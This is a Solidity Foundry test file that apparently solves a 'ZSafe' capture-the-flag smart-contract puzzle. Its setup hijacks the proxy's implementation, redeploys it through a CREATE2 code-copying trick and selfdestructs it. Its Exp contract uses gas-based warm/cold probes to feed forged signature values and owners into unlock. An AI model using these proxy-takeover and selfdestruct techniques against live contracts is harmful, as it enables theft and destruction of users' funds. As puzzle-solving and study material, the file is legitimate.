// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {SafeCurta, SafeChallenge, SafeProxy} from "src/ZSafe.sol";

contract Create2Deployer {
  address public implementation;

  function deploy(bytes32 salt) public returns (address) {
    return address(new CodeFetcher{salt: salt}()); 
  }

  function setRuntimeCodeAddr(address _impl) public {
    implementation = _impl;
  }

  function getRuntimeCode() public returns (address, bytes memory) {
    bytes memory runtimeCode = new bytes(3000);
    address impl = implementation;
    assembly {
      let size := extcodesize(impl)
      extcodecopy(impl, add(runtimeCode, 0x20), 0, size)
      mstore(runtimeCode, size)
    }

    return (impl, runtimeCode);
  }
}

contract CodeFetcher {
  constructor() {
    (bool success, bytes memory ret) = 
      msg.sender.call(abi.encodeCall(Create2Deployer.getRuntimeCode, ()));

    (address impl, bytes memory runtimeCode) = abi.decode(ret, (address, bytes));

    uint256 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    assembly {
      sstore(implSlot, impl)
      return(add(runtimeCode, 0x20), mload(runtimeCode))
    }
  }
}

contract Kill {
  function kill() public {
    selfdestruct(payable(0));
  }
}

contract Exp {
  address internal _owner;

  function p1() public returns (uint256) {
    uint256 gasBefore;
    uint256 gasAfter;

    gasBefore = gasleft();
    uint256 balance = address(100).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // First time
      return 33274667319699734978483888244153890353962414492454110431079457642165212626624;
    }

    gasBefore = gasleft();
    balance = address(101).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // Second time
      return 23432937408111976104700243840856668450786427584830511347559538109258846666683;
    }

    // Third time
    return 4925270325952440240662582894669060557633538796116987611727056330685428299651;
  }

  function p2() public returns (uint256) {
    uint256 gasBefore;
    uint256 gasAfter;

    gasBefore = gasleft();
    uint256 balance = address(200).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // First time
      return 8831726996800148804704512272774223670918824096717611309079132875192988706343;
    }

    gasBefore = gasleft();
    balance = address(201).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // Second time
      return 0;
    }

    gasBefore = gasleft();
    balance = address(300).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // First time
      return 43167282239384100131202836454954805516586903517301636761734543619881290465196;
    }

    gasBefore = gasleft();
    balance = address(301).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // Second time
      return 0;
    }

    gasBefore = gasleft();
    balance = address(400).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // First time
      return 16843765903337599149304169691317307334365087792215883480272089804062493740419;
    }

    gasBefore = gasleft();
    balance = address(401).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // Second time
      return 0;
    }
  }

  function owner() public returns (address) {
    uint256 gasBefore;
    uint256 gasAfter;

    gasBefore = gasleft();
    uint256 balance = address(500).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // First time
      return 0xcCBa8117f016d3DFd022A4bdE363F01E5724A1F0;
    }

    gasBefore = gasleft();
    balance = address(501).balance;
    gasAfter = gasleft();
    if (gasBefore - gasAfter > 500) {
      // Second time
      return 0xCdAd105bDEB9799D4af9811D07f262fA93cA9c1f;
    }

    // Third time
    return 0xa60bc8f2A3A3D7350E2EeB2aae877f3214986f4B;
  }
}

contract ZSafeTest is Test {
  SafeCurta public safeCurta;
  SafeProxy public proxy;
  SafeChallenge public challenge;
  Create2Deployer create2Deployer;

  address public player = address(1);

  function setUp() public {
    safeCurta = new SafeCurta();

    _killImplementation();
  }


  function testSeed() public {
    uint256 tmp = safeCurta.generate(player);
    bytes32 rng_seed = keccak256(abi.encodePacked(tmp));
    console2.logBytes32(rng_seed);
  }

  function testSolve() public {
    Exp exp = new Exp();
    create2Deployer.setRuntimeCodeAddr(address(exp));
    create2Deployer.deploy(bytes32(0));

    bytes32[3] memory r = [
      bytes32(0x4acb627c9db492803095b7e5483fa2d976716b5929aad4f8eb78246f1d961c6a),
      bytes32(0x95e5e1b165f4a7b30c351c41d6115171d9345501dc2387b22a2291b1bea5af7e),
      bytes32(0xa9f285f9a7497644c7ea1933d4a26a9ebaf8669c51b8857c61b336b0deb3cc5d)
    ];
    bytes32[3] memory s = [bytes32(0), bytes32(0), bytes32(0)];
    challenge.unlock(r, s);
    assertEq(challenge.isUnlocked(), true);
  }

  function _killImplementation() internal {
    uint256 seed = safeCurta.generate(player);
    challenge = SafeChallenge(safeCurta.deploy(seed, address(this)));
    
    create2Deployer = new Create2Deployer();

    proxy = challenge.proxy();
    uint256 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address impl = address(uint160(uint256(vm.load(address(proxy), bytes32(implSlot)))));

    create2Deployer.setRuntimeCodeAddr(impl);

    address newImpl = create2Deployer.deploy(bytes32(0));

    proxy.upgradeToAndCall(newImpl, "");

    Kill killer = new Kill();
    bytes32[] memory whitelist = new bytes32[](1);
    whitelist[0] = address(killer).codehash;
    SafeProxy(newImpl).initialize(address(this), whitelist);
    SafeProxy(newImpl).upgradeToAndCall(address(killer), abi.encodeCall(Kill.kill, ()));
  }
}
